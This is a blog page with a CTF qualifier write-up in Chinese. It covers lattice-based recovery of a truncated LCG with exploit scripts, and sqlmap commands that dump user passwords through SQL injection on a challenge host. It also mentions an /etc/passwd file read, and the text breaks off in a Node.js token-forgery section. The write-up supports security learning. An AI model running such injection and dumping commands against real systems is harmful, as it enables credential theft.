@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allRank 3 &#x2F; Team: CakeisTheFake好久沒跟 Cake 的夥伴一起打 CTF 了，這次大家配合ㄉ好好，決賽一起好好玩耍八 XD   這次發揮的蠻穩（？）責任區的 Web 和 Crypto 都有做出來，雖然我 Crypto 只有做一題用 ChatGPT 幾乎不可解的題目，但我學長 @unicorn 硬花著一下午用 GPT 打完了，但我很快首殺掉了它">
+<meta property="og:type" content="article">
+<meta property="og:title" content="神盾盃 2025 Qual Writeup - by Whale120">
+<meta property="og:url" content="http://wha13.github.io/2025/09/28/aegis-2025/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allRank 3 &#x2F; Team: CakeisTheFake好久沒跟 Cake 的夥伴一起打 CTF 了，這次大家配合ㄉ好好，決賽一起好好玩耍八 XD   這次發揮的蠻穩（？）責任區的 Web 和 Crypto 都有做出來，雖然我 Crypto 只有做一題用 ChatGPT 幾乎不可解的題目，但我學長 @unicorn 硬花著一下午用 GPT 打完了，但我很快首殺掉了它">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1cxL9Hnex.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJMLGiB3gx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJxBQoH2lg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H19IBjB3lg.png">
+<meta property="article:published_time" content="2025-09-29T00:21:20.000Z">
+<meta property="article:modified_time" content="2025-09-27T18:11:18.945Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Cryptography">
+<meta property="article:tag" content="CakeisTheFake">
+<meta property="article:tag" content="LLL">
+<meta property="article:tag" content="LCG">
+<meta property="article:tag" content="nodejs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/B1cxL9Hnex.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>神盾盃 2025 Qual Writeup - by Whale120</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/08/25/hitcon-qual-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/09/28/aegis-2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/09/28/aegis-2025/&text=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/09/28/aegis-2025/&is_video=false&description=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=神盾盃 2025 Qual Writeup - by Whale120&body=Check out this article: http://wha13.github.io/2025/09/28/aegis-2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/09/28/aegis-2025/&title=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/09/28/aegis-2025/&name=神盾盃 2025 Qual Writeup - by Whale120&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/09/28/aegis-2025/&t=神盾盃 2025 Qual Writeup - by Whale120"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secret-In-Frame-revenge"><span class="toc-number">2.1.</span> <span class="toc-text">Secret In Frame revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Amnesia-Dose"><span class="toc-number">3.1.</span> <span class="toc-text">Amnesia Dose</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecureAPI"><span class="toc-number">3.2.</span> <span class="toc-text">SecureAPI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">4.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        神盾盃 2025 Qual Writeup - by Whale120
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-29T00:21:20.000Z" class="dt-published" itemprop="datePublished">2025-09-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/CakeisTheFake/" rel="tag">CakeisTheFake</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/LCG/" rel="tag">LCG</a>, <a class="p-category" href="/tags/LLL/" rel="tag">LLL</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/nodejs/" rel="tag">nodejs</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Rank 3 &#x2F; Team: CakeisTheFake<br>好久沒跟 Cake 的夥伴一起打 CTF 了，這次大家配合ㄉ好好，決賽一起好好玩耍八 XD<br><img src="https://hackmd.io/_uploads/B1cxL9Hnex.png" alt="image">  </p>
+<p>這次發揮的蠻穩（？）<br>責任區的 Web 和 Crypto 都有做出來，<del>雖然我 Crypto 只有做一題用 ChatGPT 幾乎不可解的題目，但我學長 @unicorn 硬花著一下午用 GPT 打完了</del>，但我很快首殺掉了它 :)，感謝 SmileyCTF 前陣子才提醒我這個問題的存在性(x)  </p>
+<p>就來快速 Writeup 一下吧，其它就是 Web 太簡單（線性調分，三題分數加起來還沒有一個　Pwn&#x2F;Crypto 高，這樣對嗎www）  </p>
+<p>喔還有就是，Misc 到底怎麼猜到 <code>?id=1</code> 可以把 1 換成 <code>/etc/passwd</code> LFI 和什麼泡芙阿姨怪 Stego 題目，Misc 出題者腦洞真的頗大，<del>題目品質落差有點大</del>  </p>
+<p>其它冷知識，原來這場是中科院辦的  </p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Secret-In-Frame-revenge"><a href="#Secret-In-Frame-revenge" class="headerlink" title="Secret In Frame revenge"></a>Secret In Frame revenge</h3><p>本場的 Crypto 守台題，其實就是 <code>a-1</code> 和 <code>mod</code> 互質的 Truncated LCG Problem，透過部分 leak 的 bits 完成隨機數預測後直接把結果帶進去 seed 算就可以找出 FLAG 字元打散後的排序  </p>
+<p>所謂的 Truncated LCG Problem 就是一般的 $x_i \equiv a*x_{i-1}+b\space(mod\space p)$ 的 LCG Problem 做隨機數，但是只給你前幾或後幾 bits，反正就是有資料損耗的一個 case  </p>
+<p>詳細可以看 <del>或者你只是想 Script Kiddie</del>：<br><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/37836/problem-with-lll-reduction-on-truncated-lcg-schemes">https://crypto.stackexchange.com/questions/37836/problem-with-lll-reduction-on-truncated-lcg-schemes</a><br><a target="_blank" rel="noopener" href="https://gist.github.com/maple3142/c7c31d2e5893d524e71eb5e12b0278f0">https://gist.github.com/maple3142/c7c31d2e5893d524e71eb5e12b0278f0</a>  </p>
+<p>但快速翻譯年糕一下：<br>首先，先考慮一種降階版的 case，也就是 b &#x3D; 0 的時候。<br>這時候我們有 $x_i-x_{i-1}*a \equiv 0 \space (mode \space p)$  </p>
+<p>於是可以嘗試構造一個 Lattice，它的其中一個解正好就是 {x}<br>$$<br>L &#x3D; \begin{pmatrix}<br>p &amp; 0 &amp;&amp; \dots &amp; 0\<br>\alpha &amp; -1 &amp;0&amp; \dots &amp; 0\<br>\alpha^2 &amp; 0 &amp; -1 &amp; \dots &amp; 0\<br>\vdots &amp;&amp;&amp;\ddots &amp; \vdots\<br>\alpha^{k-1} &amp; 0 &amp; 0 &amp; \dots &amp; -1\<br>\end{pmatrix}<br>$$</p>
+<p>考慮到 $\mathbf{x}$ 為原本 x 解的向量，同時另 y 為高位 z 為低位<br>我們考慮 <code>B = LLL(L)</code> 會是某一組(幾乎可說是)最小的線性解，那就可以用如下的推導：</p>
+<p>$$<br>\begin{align}<br>&amp; L \cdot \mathbf{x} \equiv 0 \pmod{p} \<br>&amp; B \cdot \mathbf{x} \equiv 0 \pmod{p} \<br>&amp; B \cdot \mathbf{x} &#x3D; p \cdot \mathbf{k} \quad \mbox{( $\mathbf{k}$ 未知)}  \<br>&amp; B \cdot (\mathbf{y} + \mathbf{z}) &#x3D; p \cdot \mathbf{k}  \<br>&amp; B \cdot \mathbf{z} &#x3D; p \cdot \mathbf{k} - B \cdot \mathbf{y}<br>\end{align}<br>$$</p>
+<p>因為我們知道 B 是小向量，那 k 也必須相對是。<br>於是我們有，換句話說我們知道 $k_i<em>p$ 超級靠近 $(B</em>y)_i$ (因為 z 的量級跟 y 比起相對小很多，它是後面的位元)  </p>
+<p>取<br>$$<br>k_i &#x3D; \lfloor (B’ \cdot \mathbf{y})_i &#x2F; p \rceil<br>$$</p>
+<p>然後最後根據上面那條，解個簡單的線性方程就有 z 的結果，我們就成功還原了整個 LCG  </p>
+<p>接下來，把 b 放回來（不為 0）怎麼辦？<br>如果 a-1 跟 p 互質  </p>
+<p>我們可以考慮到變換，把所有的 $x_i$ 都加上 $\frac{b}{a-1}$ 做一個橫移，帶回去原(b&#x3D;0)式就會發現自然成立了(b!&#x3D;0) 的原始 case  </p>
+<p>$$<br>\begin{align}<br>&amp; x_i’ &#x3D; x_i+\frac{b}{a-1} \newline<br>&amp; a \cdot x_{i-1}’ &#x3D; a \cdot (x_{i-1}+\frac{b}{a-1})&#x3D;a \cdot x_{i-1} + b + \frac{b}{a-1} &#x3D;  x_i+\frac{b}{a-1} &#x3D; x_i’<br>\end{align}<br>$$</p>
+<p>最後記得移回來  </p>
+<p>題目 src，原諒我現在還是不會縮排 code ;P  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">frame_count = <span class="number">6572</span></span><br><span class="line">frames = [[<span class="string">f&#x27;sketch_frames/frame_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>, random.choice(string.ascii_letters)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(frame_count)]</span><br><span class="line">flag = <span class="string">&#x27;fake_flag&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = getPrime(<span class="number">128</span>)</span><br><span class="line">a = random.randint(<span class="number">0</span>, m-<span class="number">1</span>)</span><br><span class="line">b = random.randint(<span class="number">0</span>, m-<span class="number">1</span>)</span><br><span class="line">seed = random.randint(<span class="number">0</span>, m-<span class="number">1</span>)</span><br><span class="line">hint = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    seed = (a * seed + b) % m</span><br><span class="line">    hint.append(seed &gt;&gt; <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">random.seed((a * seed + b) % m)</span><br><span class="line">flag_position = random.choices(<span class="built_in">range</span>(frame_count), k=<span class="built_in">len</span>(flag))</span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag_position):</span><br><span class="line">    frames[j][<span class="number">1</span>] = flag[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, frame=frames[<span class="number">0</span>], idx=<span class="number">0</span>, auto=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        idx = request.values[<span class="string">&#x27;idx&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> request.values.get(<span class="string">&#x27;auto&#x27;</span>):</span><br><span class="line">            auto = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            auto = <span class="literal">False</span></span><br><span class="line">        idx = <span class="built_in">int</span>(idx) % frame_count</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, frame=frames[idx], idx=idx, auto=auto)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, frame=frames[<span class="number">0</span>], idx=<span class="number">0</span>, auto=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint_page</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hint.html&#x27;</span>, m=m, a=a, b=b, hint=hint)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8081</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>反正這是我的 Exploit，先去算 LCG，因為 python 和 sage random 實做不太一樣，後面又自己用 python 寫腳本去排 flag 字元順序還原 flag  </p>
+<p><strong>exp.sage</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_L</span>(<span class="params">k</span>):</span><br><span class="line">    M = matrix([m])</span><br><span class="line">    A = matrix([a ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, k)]).T</span><br><span class="line">    I = matrix.identity(k - <span class="number">1</span>) * -<span class="number">1</span></span><br><span class="line">    Z = matrix([<span class="number">0</span>] * (k - <span class="number">1</span>))</span><br><span class="line">    L = block_matrix([[M, Z], [A, I]])</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_tlcg</span>(<span class="params">ys, s=<span class="number">2</span> ** <span class="number">64</span></span>):</span><br><span class="line">    k = <span class="built_in">len</span>(ys)</span><br><span class="line">    L = get_L(k)</span><br><span class="line">    B = L.LLL()</span><br><span class="line">    sys = vector(y * s <span class="keyword">for</span> y <span class="keyword">in</span> ys)</span><br><span class="line">    sby = B * sys</span><br><span class="line">    ks = vector(<span class="built_in">round</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> sby / m)</span><br><span class="line">    zs = B.solve_right(ks * m - sby)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(sys + zs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">241559342483081701185852400123429794013</span></span><br><span class="line">a = <span class="number">153633328435270940802220186332982823147</span></span><br><span class="line">b = <span class="number">132459898486468873482564032845993390988</span></span><br><span class="line">truncated = [<span class="number">3998721763411970382</span>, <span class="number">12942857211706214339</span>, <span class="number">9764401007790508740</span>, <span class="number">10447004146199345794</span>, <span class="number">1820214159861546144</span>, <span class="number">1577607434621179953</span>, <span class="number">10810462017137043517</span>, <span class="number">3048014524596104802</span>, <span class="number">12322648337216621520</span>, <span class="number">1004463609833776417</span>, <span class="number">2133158877280348770</span>, <span class="number">7572815916816663167</span>, <span class="number">7984141334707625099</span>, <span class="number">5375421542639259220</span>, <span class="number">11998994914443344372</span>, <span class="number">3447231462647858220</span>, <span class="number">11993291662463289289</span>, <span class="number">2461427144968108550</span>, <span class="number">7153310651318146559</span>, <span class="number">11265256328964572048</span>]</span><br><span class="line"></span><br><span class="line">h = (b * inverse_mod(<span class="number">1</span> - a, m)) % m</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;truncated&quot;</span>, truncated)</span><br><span class="line">shifted = [</span><br><span class="line">    (x * <span class="number">2</span> ** <span class="number">64</span> + <span class="number">2</span> ** <span class="number">63</span> - h) &gt;&gt; <span class="number">64</span> <span class="keyword">for</span> x <span class="keyword">in</span> truncated</span><br><span class="line">]</span><br><span class="line">shifted_results = solve_tlcg(shifted)</span><br><span class="line">results = [x + h <span class="keyword">for</span> x <span class="keyword">in</span> shifted_results]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result&quot;</span>, results)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;seed = <span class="subst">&#123;(results[-<span class="number">1</span>]*a+b)%m&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">seed = <span class="number">234722183038933311376521413109741071427</span></span><br><span class="line">random.seed(seed)</span><br><span class="line">flag_position = random.choices(<span class="built_in">range</span>(<span class="number">6572</span>), k=<span class="number">100</span>)</span><br><span class="line">url = <span class="string">&#x27;https://aegis2025-secret-in-frame-revenge.chals.io/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_flag</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    web = req.post(url, data=&#123;<span class="string">&#x27;idx&#x27;</span>:<span class="built_in">id</span>&#125;)</span><br><span class="line">    tmp_res = web.text</span><br><span class="line">    <span class="comment">#print(tmp_res)</span></span><br><span class="line">    <span class="comment">#print(&#x27;done:&#x27;, tmp_res[tmp_res.index(&#x27;&lt;h1 class=&quot;text-light text-center d-none&quot;&gt;&#x27;)+len(&#x27;&lt;h1 class=&quot;text-light text-center d-none&quot;&gt;&#x27;)])</span></span><br><span class="line">    <span class="keyword">return</span> tmp_res[tmp_res.index(<span class="string">&#x27;&lt;h1 class=&quot;text-light text-center d-none&quot;&gt;&#x27;</span>)+<span class="built_in">len</span>(<span class="string">&#x27;&lt;h1 class=&quot;text-light text-center d-none&quot;&gt;&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_position:</span><br><span class="line">    flag+=parse_flag(i)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/HJMLGiB3gx.png" alt="image"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>這次 web 分數都過低了 &#x3D; &#x3D;，明年拜託難一點  </p>
+<h3 id="Amnesia-Dose"><a href="#Amnesia-Dose" class="headerlink" title="Amnesia Dose"></a>Amnesia Dose</h3><p>戳一下發現 password reset 有 sql injection ???<br>不過 sqlmap 注一注發現好像不能直接自動化 dump，稍微自己指定了一下 colum，flag 就是 admin 密碼  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --url <span class="string">&#x27;https://aegis2025-amnesia.chals.io/forgot_password&#x27;</span> --data=<span class="string">&#x27;username=admin&#x27;</span> --string <span class="string">&#x27;I have sent the password to&#x27;</span> </span><br><span class="line">sqlmap --url <span class="string">&#x27;https://aegis2025-amnesia.chals.io/forgot_password&#x27;</span> --data=<span class="string">&#x27;username=admin&#x27;</span> --string <span class="string">&#x27;I have sent the password to&#x27;</span> --tables</span><br><span class="line">sqlmap --url <span class="string">&#x27;https://aegis2025-amnesia.chals.io/forgot_password&#x27;</span> --data=<span class="string">&#x27;username=admin&#x27;</span> --string <span class="string">&#x27;I have sent the password to&#x27;</span> -T <span class="built_in">users</span> --dump --dbms=sqlite -C username,password</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/HJxBQoH2lg.png" alt="image">  </p>
+<h3 id="SecureAPI"><a href="#SecureAPI" class="headerlink" title="SecureAPI"></a>SecureAPI</h3><p>Nodejs 題，要完成某個 token 的簽名偽造<br>看關鍵的部分：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 